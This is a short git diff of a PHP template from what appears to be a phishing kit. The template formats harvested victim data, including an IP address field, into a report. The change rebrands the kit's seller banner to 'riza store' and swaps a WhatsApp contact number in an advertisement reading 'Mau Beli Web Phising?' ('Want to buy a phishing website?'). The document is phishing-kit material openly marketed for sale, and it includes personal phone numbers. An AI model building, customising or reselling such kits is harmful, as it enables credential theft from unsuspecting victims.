@@ -80,7 +80,7 @@ $pesan = <<<EOD
 		<div class="result">
 	<img src="" style="width: 100%; display: block; margin: auto;">
 			
-	 <div style="background: #ff00fb; width: 294; color: #fff; text-align: center; padding: 10px;">🔆 Web Nezo Delavie 🔆</div>
+	 <div style="background: #ff00fb; width: 294; color: #fff; text-align: center; padding: 10px;">riza store</div>
 	
 			<table class="tblResult">
             <tr>
@@ -99,7 +99,7 @@ $pesan = <<<EOD
 					<td style="text-align: center;"> $ip</td>
 				</tr>
                 </table>
-					<div style="background: #001240; width: 294; color: #fff; text-align: center; padding: 10px;"><b>Mau Beli Web Phising ? <br>Whatsapp <a href="https://wa.me/6283896640585"><b>Klik Disini</b></a>
+					<div style="background: #001240; width: 294; color: #fff; text-align: center; padding: 10px;"><b>Mau Beli Web Phising ? <br>Whatsapp <a href="https://wa.me/6285808275318"><b>Klik Disini</b></a>
 				</tr>
 </div>
 	</body>
